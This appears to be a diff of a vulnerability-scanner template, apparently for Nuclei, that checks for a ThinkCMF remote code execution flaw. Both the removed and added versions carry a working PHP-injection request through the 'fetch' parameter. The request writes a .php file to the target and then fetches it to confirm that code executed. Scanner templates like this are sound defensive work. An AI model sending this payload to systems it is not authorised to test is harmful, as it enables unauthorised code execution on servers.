@@ -1,29 +1,35 @@
 id: thinkcmf-rce
+
 info:
-  name: ThinkCMF RCE
-  author:
-  - l0ne1y
-  description: |-
-    ThinkCMF fetch 代码执行漏洞
-    ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，在本漏洞中远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。
+  name: ThinkCMF - Remote Code Execution
+  author: pikpikcu
   severity: critical
-  remediation: |-
-    #### 官方修复方案：
-    升级系统至无漏洞版本，或于官网下载安全补丁。
-requests:
-- matchers:
-  - type: dsl
-    condition: and
-    dsl:
-    - contains(body_2, "{{verify}}")
-    - status_code_2 == 200
-  raw:
-  - |
-    GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo {{verify}};\");')}} HTTP/1.1
-    Host: {{Hostname}}
-  - |
-    GET /{{randstr}}.php HTTP/1.1
-    Host: {{Hostname}}
-  req-condition: true
+  description: ThinkCMF  is susceptible to a remote code execution vulnerability.
+  reference:
+    - https://www.freebuf.com/vuls/217586.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 2
+  tags: thinkcmf,rce,intrusive
+
 variables:
-  verify: '{{rand_text_alphanumeric(8,"")}}'
+  string: "thinkcmf-rce"
+
+http:
+  - raw:
+      - |
+        GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo md5(\"{{string}}\");unlink(__FILE__);\");')}} HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a00473045022030890616e0f09cfc90e2452536e18123bff965a717169a2ef213532afea46c2b022100d2b32714e9bb740a01c43baef809ef37cde80648c9163d97ab0e741f9da9c3ec:922c64590222798bb761d5b6d8e72950
